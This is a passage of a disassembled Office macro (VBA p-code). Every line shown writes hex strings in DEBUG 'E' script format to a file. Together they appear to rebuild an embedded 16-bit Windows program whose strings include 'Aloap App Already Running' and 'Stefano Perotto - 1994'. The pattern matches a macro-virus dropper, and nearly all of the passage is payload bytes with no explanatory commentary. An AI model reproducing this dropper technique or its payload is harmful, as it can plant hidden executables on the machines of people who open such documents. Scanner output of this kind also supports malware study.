' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0960 F9 C3 57 8B 77 0A 3B 77 0C 75 03 8B 77 08 AD 83"
' 	PrintItemNL 
' Line #288:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0970 F8 FE 74 08 8B FE 24 FE 03 F0 EB F2 4F 4F 8B F7"
' 	PrintItemNL 
' Line #289:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0980 5F C3 45 55 8B EC 1E 8B 46 06 A3 98 00 C7 06 9A"
' 	PrintItemNL 
' Line #290:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0990 00 00 00 8D 66 FE 1F 5D 4D CB 45 55 8B EC 1E B8"
' 	PrintItemNL 
' Line #291:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09A0 FD 43 BA 03 00 52 50 FF 36 9A 00 FF 36 98 00 9A"
' 	PrintItemNL 
' Line #292:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09B0 2E 07 B4 05 05 C3 9E 83 D2 26 A3 98 00 89 16 9A"
' 	PrintItemNL 
' Line #293:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09C0 00 8B C2 80 E4 7F 8D 66 FE 1F 5D 4D CB 90 55 8B"
' 	PrintItemNL 
' Line #294:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09D0 EC 8B 46 08 8B 4E 0C 0B C8 8B 4E 0A 75 09 8B 46"
' 	PrintItemNL 
' Line #295:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09E0 06 F7 E1 5D CA 08 00 53 F7 E1 8B D8 8B 46 06 F7"
' 	PrintItemNL 
' Line #296:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09F0 66 0C 03 D8 8B 46 06 F7 E1 03 D3 5B 5D CA 08 00"
' 	PrintItemNL 
' Line #297:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A00 55 8B EC 33 C0 8B 4E 0E E3 79 1E 57 56 C5 76 06"
' 	PrintItemNL 
' Line #298:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A10 C4 7E 0A 8B C1 48 8B D7 F7 D2 2B C2 1B DB 23 C3"
' 	PrintItemNL 
' Line #299:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A20 03 C2 8B D6 F7 D2 2B C2 1B DB 23 C3 03 C2 40 91"
' 	PrintItemNL 
' Line #300:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A30 2B C1 92 AC 26 8A 25 3A E0 75 1F 47 E2 F5 92 91"
' 	PrintItemNL 
' Line #301:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A40 E3 3E 0B F6 75 07 8C D8 05 FF FF 8E D8 0B FF 75"
' 	PrintItemNL 
' Line #302:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A50 C2 8C C0 05 A9 07 8E C0 EB B9 2C 41 3C 1A 1A DB"
' 	PrintItemNL 
' Line #303:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A60 80 E3 20 02 C3 04 41 80 EC 41 80 FC 1A 1A DB 80"
' 	PrintItemNL 
' Line #304:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A70 E3 20 02 E3 80 C4 41 3A C4 74 C0 1B C0 83 D8 FF"
' 	PrintItemNL 
' Line #305:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A80 5E 5F 1F 5D CB 00 55 8B EC 5D C3 B8 14 00 E9 FA"
' 	PrintItemNL 
' Line #306:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A90 FC 00 45 55 8B EC 1E 83 EC 02 83 7E 06 00 75 05"
' 	PrintItemNL 
' Line #307:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AA0 C7 46 06 01 00 B8 FF FF 50 9A 9F 08 00 00 B8 20"
' 	PrintItemNL 
' Line #308:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AB0 00 50 FF 76 06 9A FF FF 00 00 89 46 FC B8 FF FF"
' 	PrintItemNL 
' Line #309:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AC0 50 9A C7 08 00 00 83 7E FC 00 75 17 A1 A0 00 0B"
' 	PrintItemNL 
' Line #310:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AD0 06 9E 00 74 0E FF 76 06 FF 1E 9E 00 83 C4 02 0B"
' 	PrintItemNL 
' Line #311:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AE0 C0 75 C2 8B 46 FC 8D 66 FE 1F 5D 4D CB 90 45 55"
' 	PrintItemNL 
' Line #312:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AF0 8B EC 1E 83 7E 06 00 74 08 FF 76 06 9A FF FF 00"
' 	PrintItemNL 
' Line #313:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B00 00 8D 66 FE 1F 5D 4D CB 45 55 8B EC 1E 83 EC 04"
' 	PrintItemNL 
' Line #314:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B10 83 7E 06 00 75 0E FF 76 08 9A F2 07 90 08 83 C4"
' 	PrintItemNL 
' Line #315:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B20 02 EB 4B 90 83 7E 08 00 75 10 FF 76 06 9A 4E 08"
' 	PrintItemNL 
' Line #316:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B30 12 07 83 C4 02 33 C0 EB 35 90 B8 FF FF 50 9A FF"
' 	PrintItemNL 
' Line #317:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B40 FF 00 00 FF 76 06 83 7E 08 00 74 06 8B 46 08 EB"
' 	PrintItemNL 
' Line #318:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B50 04 90 B8 01 00 50 B8 62 00 50 9A FF FF 00 00 89"
' 	PrintItemNL 
' Line #319:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B60 46 FC B8 FF FF 50 9A FF FF 00 00 8B 46 FC 8D 66"
' 	PrintItemNL 
' Line #320:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B70 FE 1F 5D 4D CB 90 45 55 8B EC 1E FF 76 06 9A FF"
' 	PrintItemNL 
' Line #321:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B80 FF 00 00 8D 66 FE 1F 5D 4D CB 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #322:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B90 C8 02 00 00 56 83 7E 0C 00 74 19 9A FF FF 00 00"
' 	PrintItemNL 
' Line #323:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BA0 50 1E 68 A8 00 1E 68 A2 00 6A 10 9A FF FF 00 00"
' 	PrintItemNL 
' Line #324:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BB0 33 C0 EB 30 8B 76 FE FF 76 06 FF 76 0A FF 76 08"
' 	PrintItemNL 
' Line #325:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BC0 FF 76 0C FF 76 0E 9A 4A 09 38 09 83 C4 0A 0B C0"
' 	PrintItemNL 
' Line #326:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BD0 74 10 FF 76 0E 9A E4 09 40 09 5B 8B F0 9A 14 0A"
' 	PrintItemNL 
' Line #327:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BE0 FF FF 8B C6 5E C9 CA 0A 00 00 C8 1A 00 00 56 8B"
' 	PrintItemNL 
' Line #328:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BF0 76 06 83 7E 08 00 75 4F C7 46 E6 00 00 C7 46 E8"
' 	PrintItemNL 
' Line #329:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C00 16 0A C7 46 EA 29 09 33 C0 89 46 EC 89 46 EE 89"
' 	PrintItemNL 
' Line #330:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C10 76 F0 56 1E 68 C2 00 9A FF FF 00 00 89 46 F2 C7"
' 	PrintItemNL 
' Line #331:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C20 46 F4 00 00 C7 46 F6 02 00 2B C0 89 46 FA 89 46"
' 	PrintItemNL 
' Line #332:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C30 F8 C7 46 FC CC 00 8C 5E FE 8D 46 E6 16 50 9A FF"
' 	PrintItemNL 
' Line #333:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C40 FF 00 00 0B C0 74 39 1E 68 CC 00 1E 68 DA 00 68"
' 	PrintItemNL 
' Line #334:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C50 08 20 6A 00 68 00 80 68 00 80 68 00 80 68 00 80"
' 	PrintItemNL 
' Line #335:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C60 6A 00 6A 00 56 6A 00 6A 00 9A FF FF 00 00 A3 92"
' 	PrintItemNL 
' Line #336:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C70 02 89 36 90 02 50 6A 07 9A FF FF 00 00 A1 92 02"
' 	PrintItemNL 
' Line #337:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C80 5E C9 CB 00 C8 12 00 00 EB 14 8D 46 EE 16 50 9A"
' 	PrintItemNL 
' Line #338:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C90 FF FF 00 00 8D 46 EE 16 50 9A FF FF 00 00 8D 46"
' 	PrintItemNL 
' Line #339:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CA0 EE 16 50 6A 00 6A 00 6A 00 9A FF FF 00 00 0B C0"
' 	PrintItemNL 
' Line #340:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CB0 75 D8 C9 CB CB 00 C8 14 00 00 57 56 8B 46 0C 48"
' 	PrintItemNL 
' Line #341:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CC0 74 2D 48 75 03 E9 AC 00 2D 11 00 75 03 E9 DE 00"
' 	PrintItemNL 
' Line #342:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CD0 2D 00 01 75 03 E9 BD 00 FF 76 0E FF 76 0C FF 76"
' 	PrintItemNL 
' Line #343:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CE0 0A FF 76 08 FF 76 06 9A FF FF 00 00 E9 C2 00 8B"
' 	PrintItemNL 
' Line #344:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CF0 76 0E 6A 00 9A 5F 0A 00 00 A3 7A 02 6A 01 9A FF"
' 	PrintItemNL 
' Line #345:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D00 FF 00 00 A3 7C 02 56 68 4C 04 1E 68 A2 00 1E 68"
' 	PrintItemNL 
' Line #346:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D10 E8 00 6A 1E 9A FF FF 00 00 8B F8 50 6A 00 6A 00"
' 	PrintItemNL 
' Line #347:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D20 9A FF FF 00 00 57 1E 68 EE 00 8D 46 EC 16 50 9A"
' 	PrintItemNL 
' Line #348:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D30 FF FF 00 00 83 C4 0A 1E 68 A2 00 1E 68 E8 00 8D"
' 	PrintItemNL 
' Line #349:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D40 46 EC 16 50 9A B6 0A 00 00 1E 68 A2 00 1E 68 0A"
' 	PrintItemNL 
' Line #350:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D50 01 1E 68 F2 00 9A FF FF 00 00 68 65 09 68 18 0B"
' 	PrintItemNL 
' Line #351:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D60 FF 36 90 02 9A FF FF 00 00 A3 7E 02 89 16 80 02"
' 	PrintItemNL 
' Line #352:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D70 56 E9 67 FF FF 36 80 02 FF 36 7E 02 9A FF FF 00"
' 	PrintItemNL 
' Line #353:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D80 00 FF 76 0E 68 4C 04 9A FF FF 00 00 6A 00 9A FF"
' 	PrintItemNL 
' Line #354:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D90 FF 00 00 EB 19 8B 46 0A 2D 4C 04 75 11 FF 36 80"
' 	PrintItemNL 
' Line #355:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DA0 02 FF 36 7E 02 6A 00 6A 00 9A FF FF 00 00 33 C0"
' 	PrintItemNL 
' Line #356:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DB0 99 5E 5F C9 CA 0A 00 00 C8 26 00 00 57 56 8B 76"
' 	PrintItemNL 
' Line #357:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DC0 0A 56 8D 46 DA 16 50 6A 13 9A FF FF 00 00 6A 06"
' 	PrintItemNL 
' Line #358:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DD0 1E 68 12 01 8D 46 DA 16 50 9A 60 07 A8 0B 83 C4"
' 	PrintItemNL 
' Line #359:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DE0 0A 0B C0 74 1E 56 9A FF FF 00 00 0B C0 75 14 56"
' 	PrintItemNL 
' Line #360:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DF0 9A FF FF 00 00 0B C0 74 0A 56 9A FF FF 00 00 0B"
' 	PrintItemNL 
' Line #361:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E00 C0 75 03 E9 CA 00 56 8D 46 EE 16 50 9A FF FF 00"
' 	PrintItemNL 
' Line #362:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E10 00 8B 46 F2 8B 7E EE 2B C7 89 46 FC 8B 46 F0 89"
' 	PrintItemNL 
' Line #363:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E20 46 FE 2B 46 F4 F7 D8 89 46 FA 0B FF 7F 07 C7 46"
' 	PrintItemNL 
' Line #364:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E30 F6 01 00 EB 29 8B 46 FC 03 C7 3B 06 7A 02 7C 05"
' 	PrintItemNL 
' Line #365:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E40 B8 FF FF EB 16 9A FA 06 DF 0B 2D FF 3F 0B C0 7E"
' 	PrintItemNL 
' Line #366:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E50 05 B8 01 00 EB 02 33 C0 03 C0 48 89 46 F6 83 7E"
' 	PrintItemNL 
' Line #367:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E60 FE 00 7F 07 C7 46 F8 01 00 EB 2A 8B 46 FA 03 46"
' 	PrintItemNL 
' Line #368:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E70 FE 3B 06 7C 02 7C 05 B8 FF FF EB 16 9A FA 06 F8"
' 	PrintItemNL 
' Line #369:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E80 0B 2D FF 3F 0B C0 7E 05 B8 01 00 EB 02 33 C0 03"
' 	PrintItemNL 
' Line #370:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E90 C0 48 89 46 F8 9A FA 06 0F 0C 8B C8 81 C1 E8 03"
' 	PrintItemNL 
' Line #371:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EA0 69 46 F6 30 75 99 F7 F9 03 F8 56 57 9A FA 06 BB"
' 	PrintItemNL 
' Line #372:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EB0 0A 8B C8 81 C1 E8 03 69 46 F8 30 75 99 F7 F9 03"
' 	PrintItemNL 
' Line #373:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EC0 46 FE 50 FF 76 FC FF 76 FA 6A 01 9A FF FF 00 00"
' 	PrintItemNL 
' Line #374:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0ED0 B8 FF FF 5E 5F C9 CA 06 00 2E 00 03 01 F0 09 02"
' 	PrintItemNL 
' Line #375:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EE0 00 71 00 03 01 FA 09 02 00 72 00 02 00 7C 08 01"
' 	PrintItemNL 
' Line #376:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EF0 00 00 00 03 01 29 05 01 00 01 00 03 01 49 00 01"
' 	PrintItemNL 
' Line #377:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F00 00 03 00 03 01 62 04 01 00 83 00 03 01 16 08 01"
' 	PrintItemNL 
' Line #378:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F10 00 05 00 03 01 BB 08 01 00 06 00 03 01 5D 08 01"
' 	PrintItemNL 
' Line #379:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F20 00 07 00 03 01 0C 09 02 00 01 00 03 01 20 05 01"
' 	PrintItemNL 
' Line #380:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F30 00 89 00 05 01 B4 07 01 00 72 00 03 01 DF 08 01"
' 	PrintItemNL 
' Line #381:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F40 00 0A 00 03 01 89 00 02 00 05 00 03 01 EF 0A 02"
' 	PrintItemNL 
' Line #382:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F50 00 06 00 03 01 8F 06 01 00 10 00 03 01 81 0A 02"
' 	PrintItemNL 
' Line #383:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F60 00 0A 00 03 01 E8 0A 02 00 0C 00 03 01 9D 06 01"
' 	PrintItemNL 
' Line #384:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F70 00 14 00 03 01 0A 08 01 00 17 00 03 01 22 08 01"
' 	PrintItemNL 
' Line #385:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F80 00 18 00 03 01 80 00 01 00 1E 00 03 01 FC 08 02"
' 	PrintItemNL 
' Line #386:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F90 00 17 00 03 01 47 0B 02 00 1F 00 03 01 6D 0B 02"
' 	PrintItemNL 
' Line #387:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FA0 00 20 00 03 01 5B 0B 02 00 23 00 03 01 90 0A 02"
' 	PrintItemNL 
' Line #388:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FB0 00 A4 01 03 01 CA 09 02 00 29 00 03 01 F9 02 01"
' 	PrintItemNL 
' Line #389:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FC0 00 31 00 03 01 D9 09 02 00 2A 00 03 01 C5 0A 01"
' 	PrintItemNL 
' Line #390:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FD0 00 33 00 03 01 DD 0A 01 00 34 00 03 01 78 09 02"
' 	PrintItemNL 
' Line #391:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FE0 00 AE 00 03 01 75 0A 01 00 39 00 03 01 51 0B 02"
' 	PrintItemNL 
' Line #392:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FF0 00 31 00 03 01 A5 0A 01 00 3B 00 03 01 55 0A 02"
' 	PrintItemNL 
' Line #393:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1000 00 B3 00 03 01 0A 0B 02 00 36 00 03 01 2C 0C 02"
' 	PrintItemNL 
' Line #394:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1010 00 38 00 03 01 9F 09 02 00 39 00 03 01 2A 0B 02"
' 	PrintItemNL 
' Line #395:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1020 00 3A 00 05 01 10 00 01 00 B2 00 03 01 1E 00 01"
' 	PrintItemNL 
' Line #396:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1030 00 5B 00 03 01 8C 02 01 00 66 00 03 01 48 0A 02"
' 	PrintItemNL 
' Line #397:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1040 00 6B 00 03 01 0A 0A 02 00 6C 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #398:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #399:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1060 00 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #400:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1070 00 00 00 00 00 00 00 00 00 00 00 00 01 00 FF FF"
' 	PrintItemNL 
' Line #401:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1080 00 00 00 00 5F 43 5F 46 49 4C 45 5F 49 4E 46 4F"
' 	PrintItemNL 
' Line #402:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1090 3D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #403:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 01"
' 	PrintItemNL 
' Line #404:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10B0 00 00 14 00 14 00 28 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #405:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 C1 00 00 00"
' 	PrintItemNL 
' Line #406:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #407:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10E0 00 00 00 00 00 00 8A 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #408:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10F0 00 00 00 00 00 00 00 10 01 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #409:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1100 00 00 41 6C 6F 61 70 00 41 6C 6F 61 70 20 41 70"
' 	PrintItemNL 
' Line #410:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1110 70 20 41 6C 72 65 61 64 79 20 52 75 6E 6E 69 6E"
' 	PrintItemNL 
' Line #411:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1120 67 00 61 6C 6F 61 70 69 63 6F 00 00 41 4C 4F 41"
' 	PrintItemNL 
' Line #412:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1130 50 57 6E 64 43 6C 61 73 73 00 41 6C 6F 61 70 20"
' 	PrintItemNL 
' Line #413:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1140 57 69 6E 64 6F 77 00 00 54 69 6D 65 72 00 25 64"
' 	PrintItemNL 
' Line #414:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1150 00 00 20 53 74 65 66 61 6E 6F 20 50 65 72 6F 74"
' 	PrintItemNL 
' Line #415:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1160 74 6F 20 2D 20 31 39 39 34 00 50 72 6F 6A 65 63"
' 	PrintItemNL 
' Line #416:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1170 74 00 23 33 32 37 37 32 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #417:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1180 00 00 00 00 00 00 00 00 3C 3C 4E 4D 53 47 3E 3E"
' 	PrintItemNL 
' Line #418:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1190 00 00 52 36 30 30 30 0D 0A 2D 20 73 74 61 63 6B"
' 	PrintItemNL 
' Line #419:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11A0 20 6F 76 65 72 66 6C 6F 77 0D 0A 00 03 00 52 36"
' 	PrintItemNL 
' Line #420:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11B0 30 30 33 0D 0A 2D 20 69 6E 74 65 67 65 72 20 64"
' 	PrintItemNL 
' Line #421:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11C0 69 76 69 64 65 20 62 79 20 30 0D 0A 00 09 00 52"
' 	PrintItemNL 
' Line #422:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11D0 36 30 30 39 0D 0A 2D 20 6E 6F 74 20 65 6E 6F 75"
' 	PrintItemNL 
' Line #423:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11E0 67 68 20 73 70 61 63 65 20 66 6F 72 20 65 6E 76"
' 	PrintItemNL 
' Line #424:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11F0 69 72 6F 6E 6D 65 6E 74 0D 0A 00 12 00 52 36 30"
' 	PrintItemNL 
' Line #425:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1200 31 38 0D 0A 2D 20 75 6E 65 78 70 65 63 74 65 64"
' 	PrintItemNL 
' Line #426:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1210 20 68 65 61 70 20 65 72 72 6F 72 0D 0A 00 14 00"
' 	PrintItemNL 
' Line #427:
